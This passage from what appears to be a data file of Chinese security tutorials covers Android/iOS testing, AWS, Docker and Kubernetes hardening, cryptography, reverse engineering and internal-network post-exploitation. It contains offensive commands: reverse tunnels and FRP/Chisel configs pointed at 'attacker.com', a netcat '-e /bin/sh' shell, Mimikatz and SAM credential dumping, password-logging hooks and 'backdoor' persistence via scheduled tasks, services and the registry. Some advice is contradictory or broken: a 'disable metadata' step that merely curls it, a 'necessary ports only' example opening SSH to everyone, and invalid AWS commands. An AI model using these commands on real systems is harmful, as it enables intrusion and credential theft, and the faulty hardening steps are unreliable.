    onEnter: function(args) {
        console.log("Arg0: " + Memory.readUtf8String(args[0]));
    },
    onLeave: function(retval) {
        console.log("Return: " + retval);
        retval.replace(1);  // 修改返回值
    }
});
\`\`\`

## APK 结构

\`\`\`
target.apk
├── AndroidManifest.xml    # 配置文件
├── classes.dex            # DEX代码
├── resources.arsc         # 资源文件
├── lib/                   # Native库
├── assets/                # 资源文件
└── META-INF/              # 签名信息
\`\`\`

## 签名绕过

\`\`\`bash
# 使用apktool解包
apktool d target.apk

# 修改后重新打包
apktool b target/

# 签名
jarsigner -keystore keystore.apk target.apk alias
\`\`\`
    `
  },
  {
    slug: 'android-pentest',
    title: 'Android 渗透测试',
    date: '2026-06-13',
    category: 'mobile',
    subcategory: 'android-pentest',
    tags: ['移动端安全', 'Android', '渗透测试'],
    summary: 'Android 应用安全测试方法。',
    content: `
## 测试环境搭建

\`\`\`bash
# 安装ADB
apt install android-tools-adb

# 连接设备
adb devices
adb shell

# 安装APK
adb install target.apk
\`\`\`

## 组件安全测试

### Activity 暴露

\`\`\`xml
<!-- AndroidManifest.xml -->
<activity android:exported="true" />
\`\`\`

\`\`\`bash
# 启动暴露的Activity
adb shell am start -n com.target/.MainActivity
\`\`\`

### Service 暴露

\`\`\`bash
# 启动服务
adb shell am startservice com.target/.MyService
\`\`\`

### Content Provider

\`\`\`bash
# 查询ContentProvider
adb shell content query --uri content://com.target.provider/data
\`\`\`

### BroadcastReceiver

\`\`\`bash
# 发送广播
adb shell am broadcast -a com.target.ACTION
\`\`\`

## 数据存储安全

### SharedPreferences

\`\`\`bash
# 查找SharedPreferences
adb shell run-as com.target cat /data/data/com.target/shared_prefs/*.xml
\`\`\`

### SQLite 数据库

\`\`\`bash
# 查找数据库
adb shell run-as com.target ls /data/data/com.target/databases/

# 导出数据库
adb pull /data/data/com.target/databases/app.db
\`\`\`

## 流量分析

### 使用 BurpSuite

\`\`\`
1. 配置Burp代理
2. 安装Burp证书
3. 设置手机代理
4. 抓包分析
\`\`\`

### 使用 Frida

\`\`\`javascript
// SSL Pinning绕过
Java.perform(function() {
    var TrustManager = Java.registerClass({
        name: "com.target.TrustManager",
        implements: [Java.use("javax.net.ssl.X509TrustManager")],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
});
\`\`\`

## 常见漏洞

1. 组件暴露
2. 数据明文存储
3. 弱加密算法
4. 不安全的网络通信
5. 代码可逆向
    `
  },
  {
    slug: 'ios-reverse',
    title: 'iOS 逆向基础',
    date: '2026-06-11',
    category: 'mobile',
    subcategory: 'ios-reverse',
    tags: ['移动端安全', 'iOS', '逆向'],
    summary: 'iOS 应用逆向分析基础。',
    content: `
## iOS 逆向工具

| 工具 | 用途 |
|------|------|
| class-dump | 导出类信息 |
| Hopper | 二进制分析 |
| IDA Pro | 二进制分析 |
| Frida | 动态Hook |
| Reveal | UI分析 |
| Keychain-Dumper | 钥匙串导出 |

## IPA 文件结构

\`\`\`
target.ipa
├── Payload/
│   └── target.app/
│       ├── Info.plist
│       ├── target (Mach-O)
│       ├── Frameworks/
│       └── _CodeSignature/
\`\`\`

## 反编译流程

\`\`\`bash
# 解压IPA
unzip target.ipa -d output/

# 导出类信息
class-dump target.app/target > classes.h

# 使用Hopper分析
\`\`\`

## 代码签名

\`\`\`bash
# 查看签名
codesign -dvvv target.app

# 重签名
codesign -f -s "iPhone Developer: xxx" target.app

# 使用ios-deploy
ios-deploy --bundle target.app
\`\`\`

## Frida Hook

### Objective-C Hook

\`\`\`javascript
// Hook OC方法
var_resolver = new ApiResolver("objc");
var resolver = new ApiResolver("objc");
resolver.enumerateMatches({
    pattern: '-[* userController]',
    onMatch: function(match) {
        var impl = new NativeFunction(match.address, 'void', ['pointer', 'pointer']);
        Interceptor.attach(match.address, {
            onEnter: function(args) {
                var password = ObjC.Object(args[2]);
                console.log("Password: " + password.toString());
            }
        });
    }
});
\`\`\`

### Swift Hook

\`\`\`javascript
// Hook Swift函数
var module = Process.getModuleByName("target");
module.enumerateSymbols().forEach(function(symbol) {
    if (symbol.name.indexOf("ViewController") !== -1) {
        console.log(symbol.name);
    }
});
\`\`\`

## 越狱检测绕过

\`\`\`javascript
// 常见越狱检测
var jailbreakChecks = [
    "/Applications/Cydia.app",
    "/Library/MobileSubstrate/MobileSubstrate.dylib",
    "/bin/bash",
    "/usr/sbin/sshd"
];

// 绕过
Interceptor.attach(Module.findExportByName(null, "access"), {
    onEnter: function(args) {
        this.path = args[0].readUtf8String();
    },
    onLeave: function(retval) {
        if (this.path && jailbreakChecks.indexOf(this.path) !== -1) {
            retval.replace(-1);
        }
    }
});
\`\`\`

## Keychain 分析

\`\`\`bash
# 导出钥匙串
iOS/keychain-dumper

# 使用Keychain Dump
keychain-dumper -a
\`\`\`
    `
  },
  {
    slug: 'miniapp-pentest',
    title: '微信小程序渗透测试',
    date: '2026-06-10',
    category: 'mobile',
    subcategory: 'miniapp-pentest',
    tags: ['移动端安全', '小程序', '渗透测试'],
    summary: '微信小程序安全测试方法。',
    content: `
## 小程序结构

\`\`\`
target/
├── app.js
├── app.json
├── app.wxss
├── pages/
└── project.config.json
\`\`\`

## 获取小程序包

### 方法1：模拟器

\`\`\`
1. 使用PC版微信
2. 打开小程序
3. 在文档目录查找wxapkg文件
\`\`\`

### 方法2：抓包

\`\`\`
1. 使用BurpSuite抓包
2. 找到小程序下载链接
3. 下载wxapkg文件
\`\`\`

## 反编译

\`\`\`bash
# 安装工具
npm install -g wxappUnpacker

# 反编译
wxappUnpacker target.wxapkg

# 或使用 unveilr
unveilr target.wxapkg -o output/
\`\`\`

## 安全测试

### 接口测试

\`\`\`
1. 找到API接口
2. 测试未授权访问
3. 测试参数篡改
4. 测试注入漏洞
\`\`\`

### 配置文件

\`\`\`javascript
// 检查app.json
{
  "appid": "wx...",
  "serverUrl": "https://api.target.com"
}

// 检查是否有敏感信息
\`\`\`

### 代码审计

\`\`\`javascript
// 检查硬编码密钥
var secret = "1234567890abcdef";

// 检查不安全存储
wx.setStorageSync('token', token);
\`\`\`

## 常见漏洞

1. 接口未授权
2. 敏感信息泄露
3. 不安全的数据存储
4. 逻辑漏洞
5. 注入漏洞

## 工具

- **wxappUnpacker**：反编译
- **unveilr**：反编译
- **BurpSuite**：抓包
- **Fiddler**：抓包
    `
  },
  // 云安全
  {
    slug: 'aws-security',
    title: 'AWS 安全配置指南',
    date: '2026-06-09',
    category: 'cloud',
    subcategory: 'aws-security',
    tags: ['云安全', 'AWS', '配置'],
    summary: 'AWS 云环境安全配置最佳实践。',
    content: `
## IAM 安全

### 最小权限原则

\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::bucket/*"
    }
  ]
}
\`\`\`

### 多因素认证

\`\`\`bash
# 启用MFA
aws iam enable-mfa-user --user-name admin --serial-number arn:aws:iam::123456789:mfa/admin
\`\`\`

## S3 存储桶安全

### 访问控制

\`\`\`bash
# 检查公开访问
aws s3api get-bucket-acl --bucket my-bucket

# 禁用公开访问
aws s3api put-public-access-block --bucket my-bucket --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true
\`\`\`

### 加密

\`\`\`bash
# 启用默认加密
aws s3api put-bucket-encryption --bucket my-bucket --server-side-encryption-configuration '{"Rules":[{"ApplyServerSideEncryptionByDefault":{"SSEAlgorithm":"AES256"}}]}'
\`\`\`

## EC2 安全

### 安全组

\`\`\`bash
# 只开放必要端口
aws ec2 authorize-security-group-ingress --group-id sg-xxx --protocol tcp --port 22 --cidr 0.0.0.0/0
\`\`\`

### 实例元数据

\`\`\`bash
# 禁用元数据（防SSRF）
curl http://169.254.169.254/latest/meta-data/
\`\`\`

## CloudTrail

\`\`\`bash
# 启用日志
aws cloudtrail create-logging-status --name my-trail --s3-bucket-name my-bucket

# 查看日志
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin
\`\`\`

## 安全工具

- **Prowler**：AWS安全审计
- **ScoutSuite**：云安全审计
- **CloudMapper**：AWS架构可视化
    `
  },
  {
    slug: 'docker-security',
    title: 'Docker 安全最佳实践',
    date: '2026-06-08',
    category: 'cloud',
    subcategory: 'docker-security',
    tags: ['云安全', 'Docker', '容器'],
    summary: 'Docker 容器安全配置和加固。',
    content: `
## 镜像安全

### 使用最小基础镜像

\`\`\`dockerfile
# 使用Alpine
FROM alpine:3.18

# 避免使用
FROM ubuntu:latest
\`\`\`

### 非Root用户

\`\`\`dockerfile
RUN adduser -D appuser
USER appuser
\`\`\`

### 扫描漏洞

\`\`\`bash
# 使用Trivy
trivy image nginx:latest

# 使用Snyk
snyk container test nginx:latest
\`\`\`

## 运行时安全

### 只读文件系统

\`\`\`bash
docker run --read-only --tmpfs /tmp nginx
\`\`\`

### 资源限制

\`\`\`bash
docker run --memory=512m --cpus=1 nginx
\`\`\`

### 禁用特权

\`\`\`bash
# 避免使用
docker run --privileged nginx
\`\`\`

## 网络安全

### 使用自定义网络

\`\`\`bash
docker network create --driver bridge my-network
docker run --network my-network nginx
\`\`\`

### 限制容器间通信

\`\`\`bash
docker run --icc=false nginx
\`\`\`

## Docker Bench

\`\`\`bash
# 运行安全检查
docker run -it --net host --pid host docker/docker-bench-security
\`\`\`

## 常见风险

1. 特权容器逃逸
2. 镜像漏洞
3. 敏感信息泄露
4. 不安全的网络配置
5. 资源滥用
    `
  },
  {
    slug: 'k8s-security',
    title: 'Kubernetes 安全',
    date: '2026-06-07',
    category: 'cloud',
    subcategory: 'k8s-security',
    tags: ['云安全', 'Kubernetes', 'K8s'],
    summary: 'Kubernetes 集群安全配置。',
    content: `
## RBAC 权限控制

\`\`\`yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: default
  name: pod-reader
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "watch", "list"]
\`\`\`

## Pod 安全

### Security Context

\`\`\`yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
  containers:
  - name: app
    image: nginx
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
\`\`\`

## 网络策略

\`\`\`yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
\`\`\`

## Secret 管理

\`\`\`bash
# 创建Secret
kubectl create secret generic my-secret --from-literal=password=xxx

# 加密存储
# 启用加密
\`\`\`

## 安全审计

\`\`\`bash
# 检查集群配置
kube-bench run

# 检查镜像漏洞
trivy image nginx:latest
\`\`\`

## 常见攻击面

1. API Server 未授权
2. etcd 数据泄露
3. 容器逃逸
4. 横向移动
5. 特权提升
    `
  },
  // 密码学
  {
    slug: 'crypto-basics',
    title: '密码学基础',
    date: '2026-06-20',
    category: 'crypto',
    subcategory: 'crypto-basic',
    tags: ['密码学', '基础', 'CTF'],
    summary: '密码学基本概念和常见加密方式。',
    content: `
## 密码学分类

### 对称加密
加密和解密使用相同密钥。

### 非对称加密
使用公钥加密，私钥解密。

### 哈希函数
单向加密，不可逆。

## 常见编码

### Base64
\`\`\`bash
echo "hello" | base64
echo "aGVsbG8=" | base64 -d
\`\`\`

### URL编码
\`\`\`
空格 → %20
< → %3C
> → %3E
\`\`\`

### Hex编码
\`\`\`
48656c6c6f → Hello
\`\`\`

### ROT13
\`\`\`
hello → uryyb
\`\`\`

### 二进制
\`\`\`
01001000 01100101 01101100 01101100 01101111 → Hello
\`\`\`

## CTF 常见

\`\`\`
Base64 → Base32 → Base16
URL编码
HTML实体编码
Unicode编码
UUencode
XXencode
\`\`\`
    `
  },
  {
    slug: 'hash-cracking',
    title: '哈希与破解',
    date: '2026-06-18',
    category: 'crypto',
    subcategory: 'hash-crack',
    tags: ['密码学', '哈希', '破解'],
    summary: '常见哈希算法和破解方法。',
    content: `
## 常见哈希算法

| 算法 | 输出长度 | 特点 |
|------|----------|------|
| MD5 | 128位 | 已不安全 |
| SHA-1 | 160位 | 已不安全 |
| SHA-256 | 256位 | 安全 |
| SHA-512 | 512位 | 安全 |

## 哈希识别

\`\`\`
MD5: 32位16进制
SHA-1: 40位16进制
SHA-256: 64位16进制
\`\`\`

## 在线破解

- https://crackstation.net/
- https://hashes.com/
- https://www.cmd5.com/

## 离线破解

### Hashcat

\`\`\`bash
# MD5
hashcat -m 0 hash.txt wordlist.txt

# SHA-1
hashcat -m 100 hash.txt wordlist.txt

# SHA-256
hashcat -m 1400 hash.txt wordlist.txt

# NTLM
hashcat -m 1000 hash.txt wordlist.txt
\`\`\`

### John the Ripper

\`\`\`bash
# 自动识别
john hash.txt

# 指定格式
john --format=raw-md5 hash.txt

# 使用字典
john --wordlist=passwords.txt hash.txt
\`\`\`

## 密码字典

- rockyou.txt
- SecLists
- PayloadsAllTheThings
    `
  },
  {
    slug: 'symmetric-crypto',
    title: '对称加密详解',
    date: '2026-06-15',
    category: 'crypto',
    subcategory: 'symmetric-crypto',
    tags: ['密码学', '对称加密', 'AES', 'DES'],
    summary: '常见对称加密算法和攻击方法。',
    content: `
## 常见算法

### DES
- 密钥长度：56位
- 分组长度：64位
- 已不安全

### 3DES
- 密钥长度：168位
- 已不安全

### AES
- 密钥长度：128/192/256位
- 分组长度：128位
- 目前安全

## 加密模式

### ECB（电子密码本）
- 明文分组独立加密
- 相同明文产生相同密文
- 不安全

### CBC（密码块链接）
- 需要初始化向量（IV）
- 前一个密文块与下一个明文异或
- 常用

### CTR
- 将计数器加密后与明文异或
- 可并行处理

## 常见攻击

### ECB 模式攻击
\`\`\`
# 相同明文块产生相同密文块
# 可进行重放攻击
\`\`\`

### Padding Oracle
\`\`\`
# 利用填充错误信息
# 逐字节解密
\`\`\`

### IV 重用
\`\`\`
# 相同IV加密相同密文
# 可进行异或攻击
\`\`\`

## CTF 工具

\`\`\`python
from Crypto.Cipher import AES

# AES 解密
cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = cipher.decrypt(ciphertext)
\`\`\`
    `
  },
  {
    slug: 'asymmetric-crypto',
    title: '非对称加密详解',
    date: '2026-06-12',
    category: 'crypto',
    subcategory: 'asymmetric-crypto',
    tags: ['密码学', 'RSA', '非对称加密'],
    summary: 'RSA 等非对称加密算法原理和攻击方法。',
    content: `
## RSA 算法

### 原理
1. 选择两个大质数 p, q
2. 计算 n = p * q
3. 计算 φ(n) = (p-1)(q-1)
4. 选择 e 使 gcd(e, φ(n)) = 1
5. 计算 d 使 e*d ≡ 1 (mod φ(n))
6. 公钥 (e, n)，私钥 (d, n)

### 加解密
\`\`\`
加密：c = m^e mod n
解密：m = c^d mod n
\`\`\`

## RSA 攻击

### 小公钥指数攻击
\`\`\`
# e 很小时，m^e < n
# 直接开 e 次方根
\`\`\`

### 共模攻击
\`\`\`
# 相同 n，不同 e 加密相同明文
\`\`\`

### 因数分解
\`\`\`
# 分解 n = p * q
# 使用 yafu、msieve、factordb.com
\`\`\`

### Wiener 攻击
\`\`\`
# d 很小时
# 使用连分数攻击
\`\`\`

### Coppersmith 攻击
\`\`\`
# 已知明文部分
\`\`\`

## CTF 工具

\`\`\`python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

# 读取公钥
key = RSA.import_key(open('pub.pem').read())

# 解密
cipher = PKCS1_OAEP.new(key)
plaintext = cipher.decrypt(ciphertext)
\`\`\`
    `
  },
  // 逆向工程
  {
    slug: 're-basics',
    title: '逆向工程基础',
    date: '2026-06-17',
    category: 're',
    subcategory: 're-basic',
    tags: ['逆向工程', '基础', 'CTF'],
    summary: '逆向工程基本概念和常用工具。',
    content: `
## 什么是逆向工程

逆向工程是分析程序二进制代码，理解其功能和逻辑的过程。

## 逆向流程

1. **识别文件类型**
2. **静态分析**
3. **动态调试**
4. **代码分析**
5. **编写脚本**

## 文件类型识别

\`\`\`bash
file target              # Linux
binwalk target           # 检查嵌入文件
strings target           # 提取字符串
xxd target | head        # 十六进制查看
\`\`\`

## PE 文件结构（Windows）

\`\`\`
┌─────────────────┐
│ DOS Header      │
├─────────────────┤
│ PE Header       │
├─────────────────┤
│ Section Table   │
├─────────────────┤
│ .text           │ ← 代码段
│ .data           │ ← 数据段
│ .rdata          │ ← 只读数据
│ .rsrc           │ ← 资源
└─────────────────┘
\`\`\`

## ELF 文件结构（Linux）

\`\`\`
┌─────────────────┐
│ ELF Header      │
├─────────────────┤
│ Program Header  │
├─────────────────┤
│ .text           │ ← 代码段
│ .data           │ ← 数据段
│ .bss            │ ← 未初始化数据
│ .rodata         │ ← 只读数据
└─────────────────┘
\`\`\`

## 常用工具

| 工具 | 用途 |
|------|------|
| IDA Pro | 反汇编分析 |
| Ghidra | 反编译 |
| x64dbg | 动态调试 |
| OllyDbg | 动态调试 |
| Radare2 | 逆向框架 |
| Binary Ninja | 二进制分析 |

## 常见混淆

- 代码混淆
- 控制流平坦化
- 虚拟机保护
- 加壳
    `
  },
  {
    slug: 'x86-assembly',
    title: 'x86 汇编基础',
    date: '2026-06-14',
    category: 're',
    subcategory: 'x86-asm',
    tags: ['逆向工程', '汇编', 'x86'],
    summary: 'x86 汇编语言基础指令和寄存器。',
    content: `
## 寄存器

### 通用寄存器
| 寄存器 | 用途 |
|--------|------|
| EAX | 累加器，返回值 |
| EBX | 基址寄存器 |
| ECX | 计数器 |
| EDX | 数据寄存器 |
| ESI | 源索引 |
| EDI | 目标索引 |
| ESP | 栈指针 |
| EBP | 基址指针 |

### 段寄存器
- CS：代码段
- DS：数据段
- SS：栈段
- ES/FS/GS：附加段

## 基本指令

### 数据传送
\`\`\`asm
mov eax, ebx      ; eax = ebx
push eax           ; 压栈
pop ebx            ; 出栈
lea eax, [ebx+8]  ; eax = ebx + 8
\`\`\`

### 算术运算
\`\`\`asm
add eax, 1        ; eax += 1
sub eax, 1        ; eax -= 1
imul eax, ebx     ; eax *= ebx
idiv ebx          ; eax /= ebx
\`\`\`

### 逻辑运算
\`\`\`asm
and eax, 0xff     ; 按位与
or eax, 0x10      ; 按位或
xor eax, eax      ; 清零
not eax           ; 取反
shl eax, 2        ; 左移
shr eax, 2        ; 右移
\`\`\`

### 比较和跳转
\`\`\`asm
cmp eax, ebx      ; 比较
je label          ; 相等跳转
jne label         ; 不相等跳转
jg label          ; 大于跳转
jl label          ; 小于跳转
jmp label         ; 无条件跳转
call function     ; 调用函数
ret               ; 返回
\`\`\`

## 函数调用

\`\`\`
┌─────────────────┐
│ 参数            │
├─────────────────┤
│ 返回地址        │
├─────────────────┤
│ 旧EBP          │ ← EBP
├─────────────────┤
│ 局部变量        │
└─────────────────┘ ← ESP
\`\`\`

## IDA 快捷键

- F5：反编译
- Space：图形视图
- N：重命名
- X：交叉引用
- G：跳转
- ;：添加注释
    `
  },
  {
    slug: 'ida-pro-guide',
    title: 'IDA Pro 使用指南',
    date: '2026-06-11',
    category: 're',
    subcategory: 'ida-pro',
    tags: ['逆向工程', 'IDA', '工具'],
    summary: 'IDA Pro 反汇编工具使用指南。',
    content: `
## IDA Pro 简介

IDA Pro 是最强大的反汇编工具，支持多种架构。

## 基本操作

### 快捷键

| 快捷键 | 功能 |
|--------|------|
| F5 | 反编译为伪代码 |
| Space | 图形/文本视图切换 |
| N | 重命名变量/函数 |
| X | 查看交叉引用 |
| G | 跳转到地址 |
| ; | 添加注释 |
| Tab | 切换视图 |

### 常用窗口

- **IDA View**：反汇编视图
- **Hex View**：十六进制视图
- **Strings**：字符串窗口
- **Functions**：函数列表
- **Imports**：导入表
- **Exports**：导出表

## 分析流程

1. **查看字符串**：Shift+F12
2. **定位 main 函数**
3. **分析关键函数**
4. **跟踪数据流**
5. **理解算法逻辑**

## 脚本编写

### IDAPython

\`\`\`python
import idaapi
import idc

# 获取当前地址
addr = idc.here()

# 获取函数名
func_name = idc.get_func_name(addr)

# 遍历所有函数
for func_ea in Functions():
    print(idc.get_func_name(func_ea))
\`\`\`

### 常用脚本

\`\`\`python
# 批量重命名
import idautils
for func_ea in idautils.Functions():
    name = idc.get_func_name(func_ea)
    if "sub_" in name:
        idc.set_name(func_ea, "func_" + hex(func_ea))
\`\`\`
    `
  },
  {
    slug: 'ghidra-guide',
    title: 'Ghidra 使用指南',
    date: '2026-06-09',
    category: 're',
    subcategory: 'ghidra',
    tags: ['逆向工程', 'Ghidra', 'NSA'],
    summary: 'Ghidra 开源逆向工具使用指南。',
    content: `
## Ghidra 简介

Ghidra 是 NSA 开发的开源逆向工程工具，支持反编译。

## 安装

\`\`\`bash
# 下载
wget https://ghidra-sre.org/ghidra_11.0_PUBLIC_20240130.zip

# 解压
unzip ghidra_*.zip

# 运行
./ghidra_*/ghidraRun
\`\`\`

## 基本操作

### 快捷键

| 快捷键 | 功能 |
|--------|------|
| L | 重命名 |
| Ctrl+E | 编辑函数签名 |
| G | 跳转到地址 |
| X | 交叉引用 |
| 双击 | 跳转 |

### 常用窗口

- **Listing**：反汇编视图
- **Decompiler**：反编译视图
- **Symbol Tree**：符号树
- **Data Type Manager**：数据类型

## 反编译

1. 导入二进制文件
2. 自动分析
3. 找到目标函数
4. 查看反编译结果

## 脚本编写

### Java 脚本

\`\`\`java
import ghidra.program.model.listing.*;
import ghidra.app.script.GhidraScript;

public class MyScript extends GhidraScript {
    @Override
    public void run() {
        Listing listing = currentProgram.getListing();
        // 分析代码
    }
}
\`\`\`

## Ghidra vs IDA

| 特性 | Ghidra | IDA |
|------|--------|-----|
| 价格 | 免费 | 商业 |
| 反编译 | 内置 | 需插件 |
| 架构支持 | 多 | 多 |
| 插件生态 | 一般 | 丰富 |
    `
  },
  // 内网渗透
  {
    slug: 'internal-recon',
    title: '内网信息收集',
    date: '2026-06-16',
    category: 'internal',
    subcategory: 'internal-recon',
    tags: ['内网渗透', '信息收集', '横向'],
    summary: '内网环境信息收集方法和工具。',
    content: `
## 本机信息

\`\`\`bash
# 系统信息
systeminfo
uname -a

# 网络信息
ipconfig /all
ifconfig -a

# 用户信息
whoami /all
net user
\`\`\`

## 网络环境

\`\`\`bash
# 路由表
route print
ip route

# ARP 表
arp -a

# 网络连接
netstat -ano
ss -antlp
\`\`\`

## 域环境

\`\`\`powershell
# 域信息
nltest /dclist:domain.com
net config workstation
net user /domain
net group "Domain Admins" /domain
\`\`\`

## 扫描工具

### fscan

\`\`\`bash
# 快速扫描
fscan -h 192.168.1.0/24

# 指定端口
fscan -h 192.168.1.0/24 -p 80,443,445,3389
\`\`\`

### CobaltStrike

\`\`\`
portscan 192.168.1.0/24 80,443,445 arp
\`\`\`

### Nmap

\`\`\`bash
nmap -sn 192.168.1.0/24
nmap -sV -p 80,443,445,3389 192.168.1.0/24
\`\`\`

## 敏感信息

\`\`\`bash
# 浏览器密码
# WiFi密码
# 文件共享
# 打印机
# 邮件服务器
\`\`\`
    `
  },
  {
    slug: 'proxy-tunnel',
    title: '代理与隧道技术',
    date: '2026-06-14',
    category: 'internal',
    subcategory: 'proxy-tunnel',
    tags: ['内网渗透', '代理', '隧道'],
    summary: '内网穿透代理和隧道技术。',
    content: `
## 代理工具

### ProxyChains

\`\`\`bash
# 配置 /etc/proxychains4.conf
socks5 127.0.0.1 1080

# 使用
proxychains nmap -sV target.com
\`\`\`

### SocksDroid（安卓）

### Proxifier（Windows/Mac）

## 隧道工具

### SSH 隧道

\`\`\`bash
# 本地转发
ssh -L 8080:internal-host:80 user@jump-server

# 远程转发
ssh -R 8080:localhost:80 user@attacker

# 动态转发（SOCKS代理）
ssh -D 1080 user@jump-server
\`\`\`

### FRP

\`\`\`ini
# frpc.ini
[common]
server_addr = attacker.com
server_port = 7000

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 6000
\`\`\`

### ngrok

\`\`\`bash
ngrok http 8080
\`\`\`

### Chisel

\`\`\`bash
# 服务端
chisel server --reverse

# 客户端
chisel client attacker.com:8080 R:socks
\`\`\`

## 端口转发

\`\`\`bash
# netcat
nc -lvp 8080 -e /bin/sh
nc attacker 8080

# socat
socat TCP-LISTEN:8080,fork TCP:internal:80
\`\`\`

## DNS 隧道

\`\`\`bash
# iodine
iodined -f tunnel.domain.com
iodine tunnel.domain.com
\`\`\`
    `
  },
  {
    slug: 'internal-post',
    title: '后渗透技术',
    date: '2026-06-12',
    category: 'internal',
    subcategory: 'internal-post',
    tags: ['内网渗透', '后渗透', '持久化'],
    summary: '获取初始访问后的后渗透技术。',
    content: `
## 信息收集

\`\`\`powershell
# 本机信息
systeminfo
ipconfig /all
whoami /all
net user

# 网络信息
arp -a
route print
netstat -ano
\`\`\`

## 权限提升

### Windows

\`\`\`powershell
# WinPEAS
winpeas.exe

# 提权漏洞
systeminfo | findstr KB
\`\`\`

### Linux

\`\`\`bash
# LinPEAS
./linpeas.sh

# SUID 提权
find / -perm -4000 2>/dev/null
\`\`\`

## 凭据获取

### Windows

\`\`\`powershell
# Mimikatz
mimikatz.exe
sekurlsa::logonpasswords

# SAM 文件
reg save HKLM\\SAM sam.hive
reg save HKLM\\SYSTEM system.hive
\`\`\`

### 浏览器密码

\`\`\`
Chrome: %LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data
Firefox: %AppData%\\Mozilla\\Firefox\\Profiles\\
\`\`\`

## 持久化

### 计划任务

\`\`\`powershell
schtasks /create /tn "backdoor" /tr "C:\\backdoor.exe" /sc minute /mo 1
\`\`\`

### 服务

\`\`\`powershell
sc create backdoor binPath= "C:\\backdoor.exe" start= auto
\`\`\`

### 注册表

\`\`\`powershell
reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v backdoor /t REG_SZ /d "C:\\backdoor.exe"
\`\`\`
    `
  },
  {
    slug: 'apt-attack',
    title: 'APT 攻击概述',
    date: '2026-06-08',
    category: 'internal',
    subcategory: 'apt',
    tags: ['APT', '高级威胁', '攻防'],
    summary: 'APT 攻击技术和常见手法。',
    content: `
## 什么是 APT

APT（Advanced Persistent Threat）高级持续性威胁，指有组织、有目标的长期攻击。

## APT 攻击阶段

1. **侦查**：目标信息收集
2. **武器化**：制作恶意载荷
3. **投递**：钓鱼邮件、水坑攻击
4. **利用**：漏洞利用
5. **安装**：植入后门
6. **C2**：命令控制
7. **目标达成**：数据窃取

## 常见手法

### 钓鱼邮件

\`\`\`
# 附件类型
- .exe
- .doc（含宏）
- .pdf（含漏洞）
- .lnk（快捷方式）
- .iso
\`\`\`

### 水坑攻击

\`\`\`
# 感染目标常访问的网站
# 植入恶意代码
# 等待目标访问
\`\`\`

### 供应链攻击

\`\`\`
# 污染软件源
# 植入后门
# 通过正常更新分发
\`\`\`

## 常见 APT 组织

| 组织 | 地区 | 目标行业 |
|------|------|----------|
| APT28 | 俄罗斯 | 政府、军事 |
| APT29 | 俄罗斯 | 政府 |
| Lazarus | 朝鲜 | 金融、加密货币 |
| OceanLotus | 越南 | 东亚 |

## 检测方法

1. 流量分析
2. 日志审计
3. 威胁情报
4. 行为分析
5. 沙箱检测
    `
  },
  // 安全开发
  {
    slug: 'secure-coding',
    title: '安全编码规范',
    date: '2026-06-15',
    category: 'securedev',
    subcategory: 'secure-coding',
    tags: ['安全开发', '编码规范', 'OWASP'],
    summary: '各语言安全编码最佳实践。',
    content: `
## 通用原则

1. **最小权限**：只授予必要的权限
2. **纵深防御**：多层安全控制
3. **输入验证**：永远不信任用户输入
4. **输出编码**：根据上下文编码
5. **安全默认**：默认安全配置

## 输入验证

### 白名单验证

\`\`\`python
import re

def validate_email(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$'
    return re.match(pattern, email) is not None
\`\`\`

### 类型检查

\`\`\`python
def get_user_id(user_id):
    if not isinstance(user_id, int):
        raise ValueError("Invalid user ID")
    return user_id
\`\`\`

## SQL 注入防御

### 参数化查询

\`\`\`python
# 正确
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# 错误
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
\`\`\`

## XSS 防御

### 输出编码

\`\`\`python
from markupsafe import escape

# 转义HTML
safe_content = escape(user_input)
\`\`\`

## 命令注入防御

\`\`\`python
import subprocess

# 正确
subprocess.run(["ls", user_input], shell=False)

# 错误
os.system(f"ls {user_input}")
\`\`\`

## 密码存储

\`\`\`python
from werkzeug.security import generate_password_hash, check_password_hash

# 存储
password_hash = generate_password_hash(password)

# 验证
check_password_hash(password_hash, input_password)
\`\`\`
    `
  },
  {
    slug: 'devsecops',
    title: 'DevSecOps 实践',
    date: '2026-06-13',
    category: 'securedev',
    subcategory: 'devsecops',
    tags: ['DevSecOps', 'CI/CD', '安全'],
    summary: 'DevSecOps 流程和工具集成。',
    content: `
## 什么是 DevSecOps

DevSecOps 是将安全集成到 DevOps 流程中的实践。

## 流程

\`\`\`
计划 → 编码 → 构建 → 测试 → 发布 → 部署 → 运维 → 监控
  ↓      ↓      ↓      ↓      ↓      ↓      ↓      ↓
 安全    安全    安全    安全    安全    安全    安全    安全
\`\`\`

## 安全测试阶段

### 开发阶段
- IDE 安全插件
- 预提交钩子
- 代码审查

### 构建阶段
- SAST（静态分析）
- 依赖检查
- 容器镜像扫描

### 测试阶段
- DAST（动态分析）
- 渗透测试
- 安全回归测试

### 部署阶段
- 配置审计
- 密钥管理
- 合规检查

## 工具

| 阶段 | 工具 |
|------|------|
| SAST | SonarQube, Semgrep, Checkmarx |
| DAST | OWASP ZAP, Burp Suite |
| SCA | Snyk, Dependency-Check |
| 容器扫描 | Trivy, Snyk Container |
| 密钥扫描 | GitLeaks, TruffleHog |

